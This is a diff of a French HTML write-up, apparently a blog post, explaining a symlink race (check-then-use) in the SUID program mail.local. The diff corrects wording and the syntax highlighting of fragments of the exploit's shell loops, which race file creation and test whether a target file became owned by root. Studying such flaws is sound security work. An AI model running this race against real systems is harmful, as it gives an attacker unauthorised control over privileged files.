@@ -53,7 +53,7 @@ les droits super utilisateurs même s'il est lancé par un autre utilisateur.
 Cela introduit quelques restrictions sur son utilisation (impossible de
 lancer <strong>ptrace</strong> sur le processus ou d'employer <strong>LD_PRELOAD</strong> par exemple).</p>
 <p>Cependant les processus SUID sont généralement considérés comme de gros
-risques de sécurité car la moindre vulnérabilité peut donner une escalade de
+risques de sécurité car la moindre vulnérabilité peut donner une élévation de
 privilèges. C'est une de ces vulnérabilités que nous allons voir maintenant.</p>
 </div>
 <div class="section" id="la-fonction-deliver">
@@ -142,7 +142,7 @@ vérification.</p>
 --------------------------------------------------------------------------
 Vérifie l'existence - Le fichier n'existe pas |
                                               | Crée symlink malicieux
-Ouvre le fichier - Suis le lien symbolique    |
+Ouvre le fichier - Suit le lien symbolique    |
 Change le propriétaire                        |
                                               | \o/ Profit !</pre>
 <p>Le bug est particulièrement agréable ici car il ne demande aucune corruption
@@ -175,10 +175,10 @@ que l'on est obligé de créer le fichier lorsque le lien est supprimé car
     touch <span class="s2">&quot;</span><span class="nv">$MAILBOX</span><span class="s2">&quot;</span>
 
     <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="k">$(</span>stat <span class="s2">&quot;</span><span class="nv">$STEALPATH</span><span class="s2">&quot;</span> -c <span class="s1">'%u'</span><span class="k">)</span><span class="s2">&quot;</span> -eq <span class="m">0</span> <span class="o">]</span> <span class="p">;</span> <span class="k">then</span>
-        <span class="nb">echo</span> <span class="s2">&quot;Yeah ! Réussi !
-        break
-    fi
-done</span></code></pre>
+        <span class="nb">echo</span> <span class="s2">&quot;Yeah ! Réussi !&quot;</span>
+        <span class="nb">break</span>
+    <span class="k">fi</span>
+<span class="k">done</span></code></pre>
 <p>La seconde boucle dans <strong>mailer.sh</strong> :</p>
 <pre class="code bash literal-block"><code><span class="k">while</span> <span class="nb">true</span> <span class="p">;</span> <span class="k">do</span>
     <span class="nb">echo</span> x <span class="p">|</span> /usr/libexec/mail.local usr <span class="m">2</span>&gt; /dev/null
